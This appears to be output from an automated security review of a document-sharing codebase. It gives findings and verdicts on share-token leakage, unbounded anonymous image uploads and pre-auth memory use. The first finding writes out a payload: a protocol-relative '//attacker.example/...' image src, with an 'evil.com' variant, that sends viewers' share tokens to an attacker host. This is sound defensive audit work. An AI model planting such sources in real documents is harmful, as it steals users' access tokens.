samples.summary: Share-token exfiltration: `isTrustedWorkspaceImageUrl` treats a protocol-relative `//attacker.example/...` src as same-origin, so the viewer's share token is appended and sent to the attacker's host — newly reachable from the docs engine because this change registers `["doc", setDocsImageUrlResolver]`.
samples.evidence:
`isTrustedWorkspaceImageUrl` (share-image-url.ts:27-31) short-circuits on `src.startsWith("/")` and then tests the UNANCHORED regex `WORKSPACE_IMAGE_PATH_RE = /\/api\/v1\/workspaces\/[^/]+\/images\/[^/?#]+/` (line 3-4) against the path. For `src = "//attacker.example/api/v1/workspaces/w1/images/x.png"`: `startsWith("/")` is true (it starts with a single `/`), and the unanchored regex matches the `/api/v1/workspaces/w1/images/x.png` substring, so the function returns true and `appendShareTokenToImageUrl` (line 55-65) returns `//attacker.example/api/v1/workspaces/w1/images/x.png?token=<viewer token>`. That string is handed to `getOrLoadImage` -> `loadImage` (packages/core/src/image/index.ts:145 `img.src = src`), which does no scheme/host validation; the browser resolves a protocol-relative URL against the current scheme and issues the request to attacker.example WITH the token in the request line. `/\evil.com/...` behaves the same under WHATWG URL parsing.

Attack: a collaborator holding an editor share link (or any workspace member) attaches a Yorkie client and writes an inline-image `src` of `//attacker.example/api/v1/workspaces/w1/images/x.png` into the docs CRDT. Every subsequent share-link visitor's canvas paints that inline, the resolver installed by `useSharedImageTokenResolver` (shared-document.tsx:900-915) appends THEIR token, and the attacker's log now holds a live share token — full document access (and, for an editor link, write access plus the new anonymous upload route).

This exact threat model is the stated reason the origin gate exists (share-image-url.ts:18-26: "a malicious collaborator can set it to https://attacker.example/... without the origin check we would append the viewer's share token and leak it to that host"), and `share-image-url.test.ts:31-37` only covers the `https://attacker.example` spelling, never the protocol-relative one. The gate is bypassable and reads as covered. The defect predates this diff (slides/notes/sheets already route through it), but this change extends the same seam to the docs engine and to a newly created class of workspace-scoped docs image URLs, which is what makes it in-scope here.

samples.summary: An anonymous editor share token grants unbounded, workspace-wide, permanently-valid write into the image bucket: no quota, no per-document scoping, and share links may be created with `expiresAt: null`.
samples.evidence: `assertCanWrite` (lines 129-143) requires only `link.role === 'editor'` and then returns `link.document.workspaceId`, which becomes the S3 key prefix at line 105. Nothing bounds cumulative writes: `ShareLink.expiresAt` is nullable (packages/backend/prisma/schema.prisma:156) so a link can be perpetual, and `ImageService.upload` (image.service.ts:102-145) enforces only a 10 MB per-object cap. With the route's own `@Throttle({limit:30, ttl:60_000})` (line 55) a single unauthenticated IP holding one leaked editor link can push 30 x 10 MB = 300 MB/min (~430 GB/day) of arbitrary bytes into the victim workspace's storage, billed to the workspace owner, from any number of IPs in parallel. The link also grants write for the *whole workspace* prefix, not just the shared document's images — the controller doc-comment acknowledges this (lines 123-127) and the TODO defers quota to `docs/design/generic-file-upload.md`. This is the first genuinely unauthenticated write path into the bucket (`POST /images` has `JwtAuthGuard`, `ApiV1ImagesController` has `CombinedAuthGuard, WorkspaceScopeGuard, ApiKeyWriteScopeGuard`), so the pre-existing deferral of quota is materially riskier here than for authenticated callers.

samples.summary: Pre-authorization memory allocation: `FileInterceptor` buffers the whole multipart body before `assertCanWrite` runs, so a caller with NO token at all can force ~10 MB of heap per request on an unauthenticated route.
samples.evidence: Nest runs guards, then interceptors, then the handler. The route mounts no guard of its own (line 50-56 has no `@UseGuards`), so the only guard is the global `ThrottlerGuard` (app.module.ts:127-130). `FileInterceptor(... limits:{fileSize: IMAGE_UPLOAD_MULTER_LIMIT_BYTES})` (lines 78-92) therefore buffers up to 10 MB + 1 into this process before `assertCanWrite(token)` (line 100 -> 129) ever executes and refuses a missing/viewer/expired token. The author documents the tradeoff (lines 70-75) and notes a guard would refuse earlier. Bounded per-request by the Multer limit and per-IP by 30/min, but note the per-IP bound is only real when `BACKEND_TRUST_PROXY` is configured (main.ts:33-42); behind an un-trusted proxy `req.ip` collapses to the proxy address. Moving the token/role check into a guard would eliminate the pre-auth allocation entirely.

verdict.reason: The claimed code exists exactly as described. `isTrustedWorkspaceImageUrl` short-circuits on `src.startsWith("/")` (share-image-url.ts:28) with no `!startsWith("//")` exclusion, and tests the UNANCHORED `WORKSPACE_IMAGE_PATH_RE` (share-image-url.ts:3-4) against the path, so `//attacker.example/api/v1/workspaces/w1/images/x.png` is treated as same-origin and `appendShareTokenToImageUrl` (share-image-url.ts:55-66) appends the viewer's share token. The resolver is installed for docs (`["doc", setDocsImageUrlResolver]`, shared-document.tsx:877; token closure at :905-913), reaches `getOrLoadImage` which applies `urlResolver` and passes the string unvalidated to `loadImage` (packages/docs/src/view/image-cache.ts:57,85), which does `img.src = src` with no scheme/host check (packages/core/src/image/index.ts:145). The browser resolves the protocol-relative URL against the page scheme and sends the token to the attacker host. The `src` is unvalidated CRDT content (paint-layout.ts:365; markdown.ts:423-427 states "Nothing validates it on the way into the model"), and no guard elsewhere blocks it — indeed the backend twin explicitly excludes this exact spelling (document-image-refs.ts:73-76), proving the frontend gate is the looser one. Tests cover only the `https://attacker.example` spelling (share-image-url.test.ts:31-37). Share-token exfiltration = sensitive credential exposure / auth bypass, in-lane and critical.

Nothing bounds cumulative writes: `ShareLink.expiresAt` is nullable (packages/backend/prisma/schema.prisma:156) so a link can be perpetual, and `ImageService.upload` (image.service.ts:102-145) enforces only a 10 MB per-object cap. verdict.reason: The code is exactly as described, but the issue is not an in-lane security defect. The gate is actually enforced: role must be 'editor' (image-share-upload.controller.ts:135), expiry is enforced in ShareLinkService.findByToken (share-link.service.ts:112-114), and there is no client-supplied workspace id — the key prefix is read off link.document.workspaceId (line 138), so no cross-workspace write is possible. The "workspace-wide prefix" is not an IDOR either: keys are server-generated randomUUID values (image.service.ts:132-133), so a token can only add new objects, never read, enumerate, or overwrite existing ones. What actually remains is the absence of a cumulative storage quota — resource exhaustion / cost abuse by a holder of a legitimately issued editor token (which already authorizes unbounded CRDT writes to the same document). Resource exhaustion is outside this lens's enumerated lane (authz, secrets, injection, crypto/auth, SSRF, deserialization, path traversal), the in-lane hardening (rate limiting) is present at line 55, and the absence of quota is an explicitly accepted repo-wide non-goal (docs/design/generic-file-upload.md:51-52 and :354-355) that applies identically to the authenticated callers of the same shared ImageService.upload (image.controller.ts:100, ApiV1ImagesController) — so there is no quota regression relative to the enforced paths.
